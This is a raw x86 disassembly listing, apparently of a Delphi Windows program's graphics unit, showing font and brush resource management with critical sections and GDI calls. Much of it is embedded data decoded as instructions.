add [ eax ] al
add eax 0x73757242
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
add [ eax + esi * 2 + 0x51c0041 ] bh
inc edx
add [ eax ] cl
add eax 0x43c0042
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov esp 0x70041e1
push es
push esp
inc edx
jb r-xdata
add al 0xdc
jmp r-xdata
dec ebp
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x580041e2 ] al
add [ eax ] al
add al al
dec eax
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
jae r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x46
outsd
outsb
je r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add al 0x24
retn
outsd
push esp
fild [ ecx ]
or al 0x0
add bh bh
je r-xdata
loop r-xdata
mov edx fs
inc ecx
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
loope r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
inc edx
jb r-xdata
loopne r-xdata
popad
outsb
jbe r-xdata
lea eax [ eax ]
push 0x41e2
insb
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
add [ edi ] al
pop es
push esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
add [ eax - 0x22 ] bh
inc ecx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
pop ebp
retn 0x4
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
mov eax [ eax ]
jmp [ eax + 0xc ]
add [ eax ] dl
add [ eax ] al
push eax
add al [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
loopne r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
loop r-xdata
and dl 0x41
add [ eax ] bl
add [ eax ] al
ror [ eax + 0x41 ] 0x0
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
imul esp [ ebx + 0x73 ] 0xdab40002
inc ecx
add [ eax - 0x3fffbe04 ] bh
cld
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
add [ ecx + ecx * 2 ] dh
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xe1b80004
inc ecx
add [ eax + eax ] dl
sub_41e3a6
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1c ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1c ] dl
inc ecx
add [ eax - 0x1c ] bl
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x6bffbeb7 ] dh
xor eax [ eax ]
pushad
jb r-xdata
push esp
sbb eax [ edx ]
mov al [ 0xffffffffd4004029 ]
sbb eax [ edx ]
mov al [ 0x38004029 ]
sbb al 0x42
add [ esp + ebx ] bh
inc edx
add [ eax + 0x4c004029 ] ah
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
nop
jo r-xdata
sbb al 0x42
add [ ecx + ebx ] dl
inc edx
add [ eax + 0x1b ] bl
inc edx
add al ah
sbb eax [ edx ]
mov al [ 0xffffffffa0004029 ]
mov al [ 0x4c004029 ]
add [ eax - 0x43ffbe8f ] ah
sbb [ edx ] eax
mov esp 0xf0004170
jb r-xdata
loopne r-xdata
add [ ecx + ebx + 0x42 ] cl
add [ eax + 0x8004029 ] ah
sbb al [ edx ]
mov al [ 0xffffffffa0004029 ]
sub [ eax ] eax
push eax
sbb eax [ edx ]
push esp
inc edi
jb r-xdata
sub [ eax ] eax
mov al [ 0xffffffffa0004029 ]
sub [ eax ] eax
add [ eax ] eax
std
[ ebx + ebx + 0x54080042 ]
inc edx
add [ eax - 0x5fffbfd7 ] ah
inc eax
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
cld
jo r-xdata
push esp
sbb eax [ edx ]
mov ah 0x31
inc edx
add [ eax - 0x63ffbdcb ] ah
cmp eax 0x3e700042
inc edx
add [ esp + ebx ] bh
inc edx
add [ edi + edi + 0x42 ] al
add [ eax - 0x47ffbdc1 ] bl
sub al [ edx ]
pop eax
sbb eax [ edx ]
loopne r-xdata
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
and [ ebx ] ch
inc edx
add [ eax - 0x43ffbe8f ] ah
sbb [ edx ] eax
pop esp
sub eax [ edx ]
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax + 0xc004029 ] ah
add ah bh
imul esp [ ebx - 0x73 ] 0xe4680040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
cmp al 0x42
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41e61070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41e59470
inc edx
add [ esp + esi + 0x42 ] bh
add [ eax + 0x42 ] bl
inc edx
add al bh
xor eax [ edx ]
pushad
inc edx
inc edx
add al cl
xor [ edx ] al
sub [ ecx ] dh
inc edx
add [ esp + edi + 0x42 ] ah
push ebx
push 0x64657261
dec ecx
or al 0x54
imul esp [ ebx - 0x14 ] 0x340041e3
dec edx
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
fsub st6
inc ecx
add [ eax ] al
jo r-xdata
insd
popad
lea eax [ bx + si ]
xor al 0xe5
jo r-xdata
push esp
sbb eax [ edx ]
lodsb [ esi ]
inc esp
inc edx
add ah dl
sbb eax [ edx ]
xor [ edi + 0x42 ] al
add [ eax ] bh
sbb al 0x42
add [ eax + 0x47 ] cl
inc edx
add [ edi + eax * 2 + 0x42 ] cl
add [ esp + ebx + 0x42 ] cl
add [ eax + 0x43 ] cl
inc edx
add [ eax + 0x1b ] bl
inc edx
add al ah
sbb eax [ edx ]
in al dx
inc ebp
inc edx
add [ edi + eax * 2 + 0x42 ] ah
add [ edi + eax * 2 + 0x47a00042 ] cl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
dec eax
out 0x41 eax
add [ edi ] al
add eax 0x6f634954
outsb
fsub st6
inc ecx
add [ esp + 0x41 ] ah
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
pushfd
inc ebx
inc edx
add [ eax - 0x43ffbe8f ] ah
sbb [ edx ] eax
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x19 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bh
inc ecx
add [ eax + eax ] dh
add [ eax ] al
mov al [ 0xffffffff940041e3 ]
xor eax [ eax ]
pushad
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
jl r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
in eax 0x41
add [ eax + eax ] dh
add [ eax - 0x6bffbe1c ] cl
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
xor al 0x20
inc edx
add [ eax + 0xc004220 ] dl
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
xchg esp eax
in eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
out 0x41 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
inc ecx
add [ eax + eax ] bh
add [ eax ] al
mov al [ 0xffffffff940041e3 ]
xor eax [ eax ]
pushad
jb r-xdata
push esp
imul esp [ ebx + 0x73 ] 0xd4900000
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
in al 0x41
add [ eax ] cl
add [ eax ] al
add al ch
adc [ eax ] al
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
mov al [ 0xc004029 ]
inc eax
add [ eax ] ch
call 0x5451e807
push edx
jo r-xdata
jo r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x180041e6 ] al
add [ eax ] al
add [ eax - 0x6bffbe1c ] cl
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
add [ ebx + 0x42 ] al
add [ eax ] dh
inc ebx
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
js r-xdata
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
inc edx
add [ eax + esi + 0x42 ] ah
add [ eax ] bl
xor [ edx ] eax
pop eax
xor [ edx ] eax
add [ esp + 0x41 ] ah
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
in eax 0x41
inc [ ebx + ebx * 8 - 0x3974f882 ]
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
call sub_4034c0
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41e5a3
add [ eax ] dh
sub eax 0x2db00042
inc edx
add [ eax ] cl
sbb al [ edx ]
xor [ fs : edx ] al
sbb [ ecx ] dh
inc edx
add [ eax + 0x31 ] bl
inc edx
add [ ebx + ebx + 0x42 ] dl
add [ ecx + esi + 0x35a00042 ] dh
inc edx
add [ ebp + edi + 0x3e700042 ] bl
cmp al 0x42
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41e61070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41e59470
inc edx
add [ esp + esi + 0x42 ] bh
add [ eax + 0x42 ] bl
inc edx
add al bh
xor eax [ edx ]
pushad
inc edx
inc edx
add al cl
xor [ edx ] al
sub [ ecx ] dh
inc edx
add [ esp + edi + 0x42 ] ah
popad
nop
fsub st6
inc ecx
add [ eax ] al
jo r-xdata
push esp
sbb eax [ edx ]
lodsb [ esi ]
inc esp
inc edx
add ah dl
sbb eax [ edx ]
xor [ edi + 0x42 ] al
add [ eax ] bh
sbb al 0x42
add [ eax + 0x47 ] cl
inc edx
add [ edi + eax * 2 + 0x42 ] cl
add [ esp + ebx + 0x42 ] cl
add [ eax + 0x43 ] cl
inc edx
add [ eax + 0x1b ] bl
inc edx
add al ah
sbb eax [ edx ]
in al dx
inc ebp
inc edx
add [ edi + eax * 2 + 0x42 ] ah
add [ edi + eax * 2 + 0x47a00042 ] cl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
dec eax
out 0x41 eax
add [ edi ] al
add eax 0x6f634954
outsb
fsub st6
inc ecx
add [ esp + 0x41 ] ah
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
pushfd
inc ebx
inc edx
add [ eax - 0x43ffbe8f ] ah
sbb [ edx ] eax
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x19 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bh
inc ecx
add [ eax + eax ] dh
add [ eax ] al
mov al [ 0xffffffff940041e3 ]
xor eax [ eax ]
pushad
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
jl r-xdata
inc eax
add [ eax ] ch
call 0x5451e807
push edx
jo r-xdata
jo r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x180041e6 ] al
add [ eax ] al
add [ eax - 0x6bffbe1c ] cl
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
add [ ebx + 0x42 ] al
add [ eax ] dh
inc ebx
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
js r-xdata
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
inc edx
add [ esp + ebx ] bh
inc edx
add [ edi + edi + 0x42 ] al
add [ eax - 0x47ffbdc1 ] bl
sub al [ edx ]
pop eax
sbb eax [ edx ]
loopne r-xdata
inc edx
add [ eax + esi + 0x42 ] ah
add [ eax ] bl
xor [ edx ] eax
pop eax
xor [ edx ] eax
push esp
sbb eax [ edx ]
mov ah 0x31
inc edx
add [ eax - 0x63ffbdcb ] ah
cmp eax 0x3e700042
add [ esp + 0x41 ] ah
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
in eax 0x41
inc [ ebx + ebx * 8 - 0x3974f882 ]
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
call sub_4034c0
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41e7ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41e828
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_41e864
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41e7d8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41e84c
xor edx edx
push ebp
push sub_41e938
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e93f
mov eax [ ebp - 0x4 ]
call sub_41e858
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_402734
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_402930
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407c60
test al al
je r-xdata
sub_41e948
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e84c
xor ecx ecx
push ebp
push sub_41e9cf
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e858
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41e9f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e84c
xor eax eax
push ebp
push sub_41ea61
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41e864
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41e948
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea68
mov eax [ ebp - 0x4 ]
call sub_41e858
retn
mov eax ebx
mov si 0xfffd
call sub_403360
sub_41ea70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e84c
xor eax eax
push ebp
push sub_41eacc
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ead3
mov eax [ ebp - 0x4 ]
call sub_41e858
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403360
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e948
sub_41eadc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e84c
xor edx edx
push ebp
push sub_41eb3b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb42
mov eax [ ebp - 0x4 ]
call sub_41e858
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41eb48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_416e84
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ebe5
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_416b18
mov ebx eax
mov eax ebx
call sub_420114
inc [ ebp - 0x4 ]
mov eax ebx
call sub_4203e0
mov eax [ rw-data ]
call sub_41eadc
mov eax [ rw-data ]
call sub_41eadc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ebec
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_416ee8
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_416b18
call sub_4202b8
inc esi
dec ebx
jne r-xdata
sub_41f23b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_4165c8
retn
sub_41f26c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402c78
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a68
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41f320
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41e864
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41f374
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41e948
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_41f3b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4170bc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41f078
xor eax eax
push ebp
push sub_41f473
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41f078
xor eax eax
push ebp
push sub_41f456
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41ea70
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41f4f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f45d
mov eax [ ebp - 0x8 ]
call sub_41f088
retn
mov eax ebx
call sub_41f778
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f794
sub_41f4a4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41f078
xor eax eax
push ebp
push sub_41f4e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41e9f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4f0
mov eax [ ebp - 0x4 ]
call sub_41f088
retn
sub_41f508
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41f691
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f698
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403ec0
retn
mov eax [ rw-data ]
call sub_41e84c
xor eax eax
push ebp
push sub_41f669
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41e858
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404100
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408540
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404100
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408540
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
